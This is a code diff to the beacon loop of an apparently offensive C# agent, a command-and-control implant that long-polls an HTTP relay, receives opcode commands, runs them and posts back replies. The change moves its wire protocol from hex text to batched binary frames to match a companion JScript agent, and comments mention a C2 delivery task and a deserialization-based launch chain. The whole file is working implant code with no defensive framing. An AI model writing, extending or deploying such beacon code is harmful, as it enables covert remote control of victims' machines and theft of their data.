@@ -6,20 +6,21 @@ using System.Text;
 namespace CSharpAgent
 {
     // The HTTP beacon loop — the SAME wire contract the JScript agent speaks (see the
-    // jscript-agent repo's "Beacon contract (v2)", spoken against the HTTP relay's root):
+    // jscript-agent repo's "Beacon contract (v3)", spoken against the HTTP relay's root):
     //
-    //   • synchronous POST to H_URL carrying the X-Agent-* identity set on EVERY request;
-    //   • request body = lowercase hex of the previous command's reply, empty when none;
-    //   • every successful answer is 200 text/plain whose body is the hex of the next
-    //     [opcode][payload] command — an empty body means nothing is queued, re-POST
-    //     immediately (the relay's 20–30 s long-poll hold is the only sleep);
+    //   • synchronous POST to H_URL carrying the X-Agent-* identity set on EVERY request
+    //     (binary bodies; the JScript agent bridges raw bytes via ADODB.Stream);
+    //   • request body = a stream of [u32le length][bytes] frames — every reply owed
+    //     since the last POST, empty when none;
+    //   • every successful answer is 200 whose body is the same frame stream of the
+    //     queued [opcode][payload] commands (batched up to 32 frames / 4 MiB) — an
+    //     empty body means nothing is queued, re-POST immediately (the relay's 20–30 s
+    //     long-poll hold is the only sleep);
     //   • any non-200 answer or transport failure is FATAL — Run() returns and the
     //     deserialization below us unwinds. No retry loop: presence is re-established by
     //     re-delivery, not by burning CPU against a dead relay.
     internal static class Beacon
     {
-        private static string _pendingHex = "";
-
         internal static void Run(string beaconUrl)
         {
             // Modern hosts/CDNs refuse anything older than TLS 1.2, and the int-cast form works
@@ -39,20 +40,24 @@ namespace CSharpAgent
             // carries 00000000 (chain completed) — the C2's delivery task sees success the
             // moment we start beaconing. Harmless when we were NOT started by an upgrade (the
             // relay drops an unsolicited response body with an empty awaiting FIFO).
-            _pendingHex = "00000000"; // u32 LE status 0, hex — the owed reply
+            var pending = new List<byte[]> { U32Bytes(0) }; // u32 LE status 0 — the owed reply
 
             while (true)
             {
-                string responseHex;
-                var ok = true;
-                try { responseHex = Post(beaconUrl, headers, _pendingHex); }
-                catch (Exception) { ok = false; responseHex = null; }
-                if (!ok || responseHex == null) return; // fatal — mirrors the JScript agent
+                byte[] responseBody;
+                try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
+                catch (Exception) { responseBody = null; }
+                if (responseBody == null) return; // fatal — mirrors the JScript agent
 
-                _pendingHex = "";
-                if (responseHex.Length == 0) continue;
-                var reply = Dispatch(HexToBytes(responseHex));
-                _pendingHex = reply == null ? "" : BytesToHex(reply);
+                pending.Clear();
+                var frames = ParseFrames(responseBody);
+                if (frames == null) return; // malformed body — fatal, same as a bad status
+                if (frames.Count == 0) continue;
+                foreach (var command in frames)
+                {
+                    var reply = Dispatch(command);
+                    if (reply != null) pending.Add(reply); // Exit never returns from Dispatch
+                }
             }
         }
 
@@ -105,14 +110,14 @@ namespace CSharpAgent
             return U32Bytes(2);
         }
 
-        // One beacon round trip: POST bodyHex (ASCII hex text; empty string ⇒ zero-length
-        // body), return the response body stripped to bare hex, or null when the answer is
-        // anything but a clean 200. Transport-level failures throw to the caller.
-        private static string Post(string url, string[][] headers, string bodyHex)
+        // One beacon round trip: POST the v3-bin frame stream, return the raw response
+        // body bytes, or null when the answer is anything but a clean 200. Transport-level
+        // failures throw to the caller.
+        private static byte[] Post(string url, string[][] headers, byte[] body)
         {
             var request = (HttpWebRequest)WebRequest.Create(url);
             request.Method = "POST";
-            request.ContentType = "text/plain";
+            request.ContentType = "application/octet-stream";
             // The relay holds each request 20–30 s server-side; keep generous headroom over
             // that window (the JScript agent's receive timeout is 45 s for the same reason).
             request.Timeout = 60000;
@@ -120,7 +125,6 @@ namespace CSharpAgent
             for (var i = 0; i < headers.Length; i++)
                 request.Headers.Add(headers[i][0], headers[i][1]);
 
-            var body = bodyHex.Length == 0 ? new byte[0] : Encoding.ASCII.GetBytes(bodyHex);
             request.ContentLength = body.Length;
             using (var stream = request.GetRequestStream())
                 stream.Write(body, 0, body.Length);
@@ -128,71 +132,63 @@ namespace CSharpAgent
             using (var response = (HttpWebResponse)request.GetResponse())
             {
                 if (response.StatusCode != HttpStatusCode.OK) return null;
-                using (var reader = new StreamReader(response.GetResponseStream(), Encoding.ASCII))
-                    return StripWhitespace(reader.ReadToEnd());
+                using (var ms = new MemoryStream())
+                {
+                    CopyStream(response.GetResponseStream(), ms);
+                    return ms.ToArray();
+                }
             }
         }
 
-        // --- Hex framing (lowercase, byte-pair text — identical to the JScript agent's) ---
+        // --- Binary framing ([u32le length][bytes] per frame — see the contract header) ---
 
-        private const string HexDigits = "0123456789abcdef";
-
-        internal static string BytesToHex(byte[] bytes)
+        private static byte[] BuildFrames(List<byte[]> frames)
         {
-            var sb = new StringBuilder(bytes.Length * 2);
-            for (var i = 0; i < bytes.Length; i++)
+            var total = 0;
+            for (var i = 0; i < frames.Count; i++) total += 4 + frames[i].Length;
+            var body = new byte[total];
+            var offset = 0;
+            for (var i = 0; i < frames.Count; i++)
             {
-                sb.Append(HexDigits[bytes[i] >> 4]);
-                sb.Append(HexDigits[bytes[i] & 15]);
+                var frame = frames[i];
+                BitConverter.GetBytes(frame.Length).CopyTo(body, offset);
+                frame.CopyTo(body, offset + 4);
+                offset += 4 + frame.Length;
             }
-            return sb.ToString();
+            return body;
         }
 
-        internal static byte[] HexToBytes(string hex)
+        /// <summary>Parse a v3-bin body into its frames. Null = malformed (caller treats it
+        /// as fatal, same as a non-200). An empty body parses to zero frames.</summary>
+        private static List<byte[]> ParseFrames(byte[] body)
         {
-            var count = 0;
-            var chars = new char[hex.Length];
-            for (var i = 0; i < hex.Length; i++)
+            var frames = new List<byte[]>();
+            var offset = 0;
+            while (offset < body.Length)
             {
-                var c = hex[i];
-                if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue;
-                chars[count++] = c;
+                if (offset + 4 > body.Length) return null;
+                var length = BitConverter.ToInt32(body, offset);
+                offset += 4;
+                if (length < 0 || offset + length > body.Length) return null;
+                var frame = new byte[length];
+                Buffer.BlockCopy(body, offset, frame, 0, length);
+                frames.Add(frame);
+                offset += length;
             }
-            var bytes = new byte[count / 2];
-            for (var i = 0; i < bytes.Length; i++)
-                bytes[i] = (byte)((Nibble(chars[i * 2]) << 4) | Nibble(chars[i * 2 + 1]));
-            return bytes;
+            return frames;
         }
 
-        private static int Nibble(char c)
+        private static void CopyStream(Stream source, MemoryStream target)
         {
-            return c >= '0' && c <= '9' ? c - '0'
-                : c >= 'a' && c <= 'f' ? c - 'a' + 10
-                : c >= 'A' && c <= 'F' ? c - 'A' + 10
-                : 0;
-        }
-
-        private static string StripWhitespace(string text)
-        {
-            if (text.IndexOf(' ') < 0 && text.IndexOf('\r') < 0 && text.IndexOf('\n') < 0 && text.IndexOf('\t') < 0)
-                return text;
-            var sb = new StringBuilder(text.Length);
-            for (var i = 0; i < text.Length; i++)
-            {
-                var c = text[i];
-                if (c != ' ' && c != '\t' && c != '\r' && c != '\n') sb.Append(c);
-            }
-            return sb.ToString();
+            var buffer = new byte[64 * 1024];
+            int read;
+            while ((read = source.Read(buffer, 0, buffer.Length)) > 0)
+                target.Write(buffer, 0, read);
         }
 
         private static byte[] U32Bytes(uint n)
         {
             return new[] { (byte)(n & 255), (byte)((n >> 8) & 255), (byte)((n >> 16) & 255), (byte)((n >> 24) & 255) };
-        }
-
-        private static string U32Hex(uint n)
-        {
-            return BytesToHex(U32Bytes(n));
         }
     }
 }
